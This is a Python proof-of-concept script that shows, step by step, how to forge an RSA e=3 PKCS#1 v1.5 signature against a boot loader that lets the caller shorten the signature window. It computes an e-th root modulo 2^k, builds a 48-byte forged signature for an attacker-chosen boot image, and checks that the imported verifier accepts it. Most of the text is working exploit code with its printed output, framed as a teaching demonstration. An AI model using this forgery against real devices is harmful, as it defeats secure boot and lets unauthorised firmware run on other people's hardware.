"""
PKCS#1 v1.5 signatures, and why a *narrower window* turns e=3 from safe into forgeable.

Three demonstrations:
  1. what a conformant EM looks like, and why e=3 has no solution at full width
     (the EM would have to be a perfect cube)
  2. what the PBL actually inspects (the low L bytes) and where the high bits go
  3. the same equation, two ways to solve it: integer cube root vs e-th root mod 2^k
"""

import hashlib
import secrets
import time

from pbl_siglen_poc import rsa_keygen, pbl_verify_signature


def icbrt(x: int) -> int:
    """Integer cube root (floor), binary search."""
    if x == 0:
        return 0
    lo, hi = 0, 1 << (x.bit_length() // 3 + 2)
    while lo < hi:
        mid = (lo + hi) // 2
        if mid ** 3 < x:
            lo = mid + 1
        else:
            hi = mid
    return lo - 1 if lo ** 3 > x else lo


def hexdump(b: bytes, per: int = 16) -> str:
    return "\n".join(
        "      %04x  %s" % (i, b[i:i + per].hex(" "))
        for i in range(0, len(b), per)
    )


def main():
    n, e = rsa_keygen(2048, e=3)
    nbits = n.bit_length()
    digest = hashlib.sha256(b"the image the attacker wants to boot").digest()
    while digest[-1] % 2 == 0:
        digest = hashlib.sha256(digest).digest()

    print("=" * 76)
    print("Step 0: n is always a full 2048 bits -- n is NOT what gets shortened")
    print("=" * 76)
    print(f"  n width = {nbits}   (declaring a 48-byte signature does not touch n at all)")
    print(f"  e       = {e}")

    # ------------------------------------------------------------------ 1 ----
    print("\n" + "=" * 76)
    print("Step 1: a conformant PKCS#1 v1.5 block (k = 256 bytes)")
    print("=" * 76)
    print("""
  signing is:    signer computes    s = EM^d mod n
  verifying is:  verifier computes  EM' = s^e mod n   then compares EM' byte by byte

  EM layout (RFC 8017 section 9.2, big-endian, 256 bytes total):

    00 01 FF FF FF ... FF FF 00 | DigestInfo | Hash
    ^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^
    fixed   padding PS (>=8 0xFF)  DER prefix  digest (32B)
                                   (this PBL does not check that part)
""")
    em = bytearray(256)
    em[0], em[1] = 0x00, 0x01
    for i in range(2, 256 - 33):
        em[i] = 0xFF
    em[256 - 33] = 0x00
    em[256 - 32:] = digest
    print(hexdump(bytes(em[:16])))
    print("      ...")
    print(hexdump(bytes(em[-48:]), 16))

    EM = int.from_bytes(bytes(em), "big")
    print(f"\n  EM as an integer: {EM.bit_length()} bits")

    # ------------------------------------------------------------------ 2 ----
    print("\n" + "=" * 76)
    print("Step 2: e=3 with a 256-byte window -- the equation the attacker must solve")
    print("=" * 76)
    print("""
  EM' = s^3 mod n has to equal EM exactly (all 2048 bits must line up).

  Two possibilities:
   (a) s^3 >= n        -> reduction kicks in, k*n is subtracted, the low bits are
                          scrambled beyond repair                     => failure
   (b) s^3 <  n        -> EM' = s^3, so s^3 must equal EM exactly
                          => EM has to be a *perfect cube*
""")
    r = icbrt(EM)
    print(f"  integer cube root r of EM = {r.bit_length()} bits (so s is only {r.bit_length() // 8} bytes)")
    print(f"  r^3 == EM ?               = {r ** 3 == EM}")
    print(f"  how far off               = {(EM - r ** 3).bit_length()} bits")
    print("\n  A random 2048-bit integer is a perfect cube with probability ~2^-1365 -- impossible.")
    print("  That is why e=3 is safe at the standard width: there are no spare bits")
    print("  left to absorb the error.")

    # ------------------------------------------------------------------ 3 ----
    L = 48
    print("\n" + "=" * 76)
    print(f"Step 3: declare L = {L} bytes -- what does the PBL check now?")
    print("=" * 76)
    print(f"""
  The PBL still computes pow(s, e, n) and still gets 256 bytes back.
  But the padding scan stops at (sig_len>>2)-1 = {(L >> 2) - 1}, and the digest
  comparison only looks at the low {len(digest)} bytes.

  In other words: of those 256 bytes only the low {L} bytes (={L * 8} bits) are checked.
                  The upper {256 - L} bytes (={(256 - L) * 8} bits) are *free bits* -- anything goes.
""")
    buf = bytearray(L)
    buf[0:32] = digest[::-1]      # internal byte order: low byte first => digest lands in the low bits
    buf[32] = 0x00                # 00 separator
    for i in range(33, L - 2):
        buf[i] = 0xFF             # 0xFF padding
    buf[L - 2] = 0x01
    buf[L - 1] = 0x00
    T = int.from_bytes(bytes(buf), "little")
    print("  what the PBL expects to see inside the window (reversed back to big-endian):")
    be = bytes(buf)[::-1]
    print(hexdump(be, 16))
    print(f"  as an integer T = {T.bit_length()} bits")

    # ------------------------------------------------------------------ 4 ----
    print("\n" + "=" * 76)
    print("Step 4: solving it -- not brute force, exact algebra")
    print("=" * 76)
    print(f"""
  The equation changed from   "s^3 equals EM exactly (2048 bits)"
  into                        "s^3 == T (mod 2^{L * 8})"

  Why that is solvable:  3 is odd, so gcd(3, 2^{L * 8 - 1}) = 1
                         => on the odd residues mod 2^{L * 8}, cubing is a bijection
                         => the inverse is just another exponentiation,
                            d = 3^(-1) mod 2^{L * 8 - 1}
                         => s = T^d mod 2^{L * 8}, one modexp, milliseconds
""")
    k = 8 * L
    t0 = time.perf_counter()
    d = pow(e, -1, 1 << (k - 1))
    s = pow(T, d, 1 << k)
    dt = time.perf_counter() - t0
    print(f"  d = 3^(-1) mod 2^{k - 1}      (cost is negligible, folded into the timing below)")
    print(f"  s = T^d mod 2^{k}   took {dt * 1000:.2f} ms   <-- the only real work in the whole attack")
    print(f"  check pow(s,3,2^{k}) == T : {pow(s, e, 1 << k) == T}")
    print(f"  s width = {s.bit_length()} bits")

    # ------------------------------------------------------------------ 5 ----
    print("\n" + "=" * 76)
    print("Step 5: why s^3 < n is mandatory (it is the one hard constraint)")
    print("=" * 76)
    s3 = pow(s, e)
    print(f"  s^3 width = {s3.bit_length()} bits, n width = {nbits} bits")
    print(f"  s^3 < n ?  {s3 < n}")
    if s3 < n:
        print(f"  => pow(s,3,n) == s^3, no reduction happened, the low {L} bytes are untouched")
    else:
        print("  => reduction happened, the low bits are scrambled, the attack fails")

    x = pow(s, e, n)
    full_le = x.to_bytes(256, "little")
    print("\n  the 256-byte result the PBL sees (little-endian, low byte first):")
    print(f"    low {L} bytes (checked)   : {full_le[:L].hex()}")
    print(f"    expected window           : {bytes(buf).hex()}")
    print(f"    match                     : {full_le[:L] == bytes(buf)}")
    print(f"    high {256 - L} bytes (ignored)  : {full_le[L:L + 16].hex()} ... "
          f"{full_le[-16:].hex()}")

    sig = s.to_bytes(L, "big")
    ok, code = pbl_verify_signature(n.to_bytes(256, "big"), (3).to_bytes(1, "big"),
                                    sig, digest)
    print(f"\n  fed back into the PBL verdict logic: {'ACCEPTED' if ok else f'rejected({code})'}")

    # ------------------------------------------------------------------ 6 ----
    print("\n" + "=" * 76)
    print("Step 6: two flavours of e=3 forgery, side by side")
    print("=" * 76)
    print(f"""
  +------------------+----------------------------+----------------------------+
  |                  | classic Bleichenbacher     | this bug (window shortened)|
  +------------------+----------------------------+----------------------------+
  | weakness used    | lax padding *parsing*      | strict padding check, but  |
  |                  | (tolerates junk/offsets)   | the window width is chosen |
  |                  |                            | by the attacker            |
  | where the free   | junk bytes after the EM    | the {(256 - L) * 8} bits above    |
  | bits live        |                            | the window                 |
  | equation         | s^3 == EM exactly          | s^3 == T (mod 2^{L * 8})    |
  | how to solve     | integer cube root          | e-th root mod 2^k (bij.)   |
  | shared dead line | s^3 < n, else reduction    | same                       |
  |                  | destroys everything        |                            |
  +------------------+----------------------------+----------------------------+

  Usable range:  e * 8L < log2(n)
    e=3     -> L < {nbits / 24:.1f}   (measured: L = 40..85 all work)
    e=65537 -> L < {nbits / (8 * 65537):.5f}  no solution
""")


if __name__ == "__main__":
    main()
